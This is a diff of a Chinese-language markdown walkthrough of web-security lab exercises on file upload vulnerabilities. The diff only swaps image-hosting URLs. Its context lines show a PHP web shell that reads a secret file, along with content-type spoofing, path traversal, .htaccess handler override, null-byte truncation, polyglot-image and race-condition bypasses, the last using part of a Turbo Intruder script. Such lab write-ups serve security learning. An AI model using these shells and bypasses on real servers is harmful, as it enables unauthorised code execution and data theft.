@@ -11,10 +11,10 @@ You can log in to your own account using the following credentials: `wiener:pet
 1. `<?php echo file_get_contents('/home/carlos/secret'); ?>`
 ```
 
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714172911462.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714172911462.png)
 
 返回并访问上传的文件链接：
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714173015727.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714173015727.png)
 
 ---
 ## Web shell upload via Content-Type restriction bypass
@@ -24,22 +24,22 @@ Sorry, file type application/x-php is not allowed Only image/jpeg and image/png 
 ```
 
 再次上传，抓包并修改MIME
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714182527264.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714182527264.png)
 
 ```
 The file avatars/mm3.php has been uploaded.
 ```
 
 访问上传成功的php文件得到：
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714182643729.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714182643729.png)
 
 ---
 ## Web shell upload via path traversal
 上传文件，修改文件名为`..%2fmm3.php`
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714184750372.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714184750372.png)
 
 则上传文件访问路径从`/files/avatars/..%2fmm3.php`变为`/files/mm3.php`
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714184946038.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714184946038.png)
 
 
 ---
@@ -52,10 +52,10 @@ Sorry, php files are not allowed Sorry, there was an error uploading your file.
 
 重新上传、抓包修改后缀为php5，可以上传，但是访问页面空白，说明没有解析
 尝试上传`.htaccess`文件，并设置``AddType application/x-httpd-php .abc``,即会将`.abc`的后缀文件解析为php文件：
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714190428691.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714190428691.png)
 
 再次上传`<?php echo file_get_contents('/home/carlos/secret'); ?>`的shell并修改后缀为abc:
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714190549141.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714190549141.png)
 
 ---
 ## Web shell upload via obfuscated file extension
@@ -65,12 +65,12 @@ Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your
 ```
 
 将后缀修改为`mm3.php.png`，成功上传，但是无法执行命令
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714191406698.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714191406698.png)
 
 那么，再次上传并使用`%00`进行截断：
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714191528381.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714191528381.png)
 
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714191603639.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714191603639.png)
 
 ---
 ## Remote code execution via polyglot web shell upload
@@ -86,7 +86,7 @@ Error: file is not a valid image Sorry, there was an error uploading your file.
 ```
 
 然后上传polyglot.php并访问:
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714200027000.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250714200027000.png)
 
 ---
 ## Web shell upload via race condition
@@ -118,7 +118,7 @@ else
 
 文件在被删除之前时间极短，手动访问肯定是来不及的
 安装Turbo Intruder插件，然后上传shell脚本并拦截，转发到Turbo Intruder,并为Turbo Intruder编写python脚本代码:
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250717110933245.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250717110933245.png)
 
 ```python
 def queueRequests(target, wordlists):
@@ -201,4 +201,4 @@ def handleResponse(req, interesting):
 ```
 
 实际功能就是上传shell,然后在被检查删除之前拼手速去请求暂时没有被删除的shell：
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250717113217808.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250717113217808.png)
